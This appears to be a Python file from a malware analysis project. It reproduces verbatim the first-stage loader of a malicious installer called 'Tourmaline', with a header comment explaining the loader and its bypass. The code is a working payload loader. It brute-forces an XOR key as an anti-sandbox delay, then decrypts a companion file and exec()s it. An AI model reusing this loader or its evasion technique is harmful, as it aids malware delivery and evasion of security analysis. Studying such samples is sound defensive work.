# =============================================================================
# stage1_loader.py — Tourmaline Stage 1: XOR Time-Lock Payload Loader
# =============================================================================
# SOURCE: Extracted verbatim from Tourmaline.exe (Inno Setup 6.7.0, Rev 2)
#         as {app}\main.py — the entry point executed by the bundled pythonw.exe.
#
# WHAT IT DOES:
#   Implements a brute-force countdown anti-sandbox delay that iterates _n from
#   99,999,999 down to 0. At each step it constructs a 33-byte XOR key:
#       key = struct.pack('>I', _n) + <29-byte hardcoded suffix>
#   It tests the key against a known-plaintext check on the first 16 bytes of
#   QGBdu.dxf. Once the correct _n is found, the entire file is decrypted and
#   exec()'d as Python bytecode (Stage 2).
#
# ANTI-SANDBOX:
#   On a real machine the loop finishes in seconds (true _n ≈ 14,511,188).
#   In a time-limited sandbox the loop never completes → payload never runs.
#
# O(1) BYPASS:
#   Known-plaintext XOR on the first 4 ciphertext bytes instantly recovers _n.
#   See src/decrypt_payload.py for the recovery tool.
#
# WARNING: This is LIVE MALWARE CODE. Do NOT execute.
# =============================================================================
import os,sys,struct
_t=bytes.fromhex('2b0cffe07b06ac25793b3f00cfaa2dd5881c2d6378165247539dbbdaeb')
_s=bytes.fromhex('6731203d206c616d626461206c362c20')
_f=open(os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])) if sys.argv[0] else os.getcwd(),'QGBdu.dxf'),'rb').read()
_kl=33
_p=None
for _n in range(99999999,-1,-1):
 _c=struct.pack('>I',_n)+_t;_ok=True
 for _i in range(16):
  if _f[_i]^_c[_i%_kl]!=_s[_i]:_ok=False;break
 if _ok:_p=_c;break
if _p:exec(bytes(_f[i]^_p[i%_kl] for i in range(len(_f))))
